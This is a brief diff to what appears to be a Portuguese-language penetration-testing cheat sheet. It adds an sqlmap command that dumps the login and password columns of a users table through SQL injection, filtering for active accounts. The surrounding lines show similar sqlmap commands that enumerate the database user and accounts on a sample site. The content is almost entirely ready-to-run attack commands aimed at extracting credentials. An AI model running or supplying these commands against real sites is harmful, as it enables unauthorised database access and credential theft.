@@ -4109,6 +4109,8 @@ Chuta os char da database um por um
 
     sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns -C 'login,senha' --dump
 
+    sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" -D dbmrtur -T mrusers --columns -C 'login,senha' --where "ativo='1'" --dump
+
     sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --current-user
 
     sqlmap -u "192.168.1.10/turismo/agencias.php?loja=sp" --users
